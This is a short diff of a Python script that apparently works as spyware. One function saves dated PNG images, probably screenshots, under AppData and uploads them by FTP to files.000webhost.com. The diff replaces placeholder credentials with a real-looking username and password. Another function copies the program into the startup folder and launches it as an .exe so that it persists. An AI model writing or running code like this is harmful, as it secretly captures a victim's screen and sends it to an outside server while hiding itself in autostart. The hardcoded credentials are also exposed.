@@ -42,7 +42,7 @@ def jul():
         jul = Path(rf'{appdata}\jul\%s.png' % date)
         
         #Connexion ftp blablabla upload du fichier
-        session = ftplib.FTP('serveur','user','password')
+        session = ftplib.FTP('files.000webhost.com','loutchocsgo','allahwakbar')
         
         file = open(jul,'rb')
         session.storbinary(f'STOR {jul.name}', file)
@@ -60,6 +60,6 @@ def startup(file_path=rf"{script_location}\%s" % filename):
     else:
         shutil.move(file_path, startuppath)
         time.sleep(30)
-        os.startfile(f"{startuppath}\%s" % filename)
+        os.startfile(f"{startuppath}\%s.exe" % filename)
 
 startup()
